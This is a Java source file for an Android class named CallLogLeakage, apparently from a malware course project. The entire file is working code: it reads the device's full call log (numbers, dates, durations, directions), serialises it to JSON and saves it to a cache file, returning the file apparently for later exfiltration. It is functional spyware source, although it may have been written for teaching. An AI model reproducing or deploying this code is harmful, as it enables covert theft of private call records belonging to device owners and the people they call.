package com.malwareclass.malwareproject;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.Date;


public class CallLogLeakage {
    private static final String TAG = "CallLogLeakage";


    public File[] leak(Context context) {
        Log.d(TAG, "Started");

        JSONObject calls = new JSONObject();
        JSONArray callArray = new JSONArray();

        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "Permission granted");

            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC");

            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while (cursor.moveToNext()) {
                JSONObject call = new JSONObject();
                try {

                    call.put("Phone number", cursor.getString(number));
                    call.put("Call type", cursor.getString(type));
                    call.put("Call date", cursor.getString(date));
                    call.put("Call number", cursor.getString(number));
                    call.put("Call duration", cursor.getString(duration));
                    String dir = null;
                    String callType = cursor.getString(type);
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;

                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;
                    }
                    call.put("Direction", dir);

                    callArray.put(call);
                } catch (JSONException e){
                    Log.d(TAG, "JSONException1");
                    e.printStackTrace();
                }
            }
            cursor.close();
            try {
                calls.put("Call Log", callArray);
            } catch (JSONException e) {
                Log.d(TAG, "JSONException");
                e.printStackTrace();
            }

            Log.d(TAG, calls.toString());
            // save JsonArr to File
            Writer output = null;
            String pathname = "callLog_" + new SimpleDateFormat("yyyy.MM.dd-HH.mm.ss").format(new Date()) + ".json";
            File file = new File(context.getCacheDir(), pathname);
            try {
                output = new BufferedWriter(new FileWriter(file));
                output.write(calls.toString());
                output.close();
                File[] files = new File[1];
                files[0] = file;
                return files;
            } catch (IOException e) {
                Log.d(TAG, "IOException");
                e.printStackTrace();
            }
        } else {
            Log.d(TAG, "Permission not granted");
        }
        Log.d(TAG, "End");
        return null;
    }
}
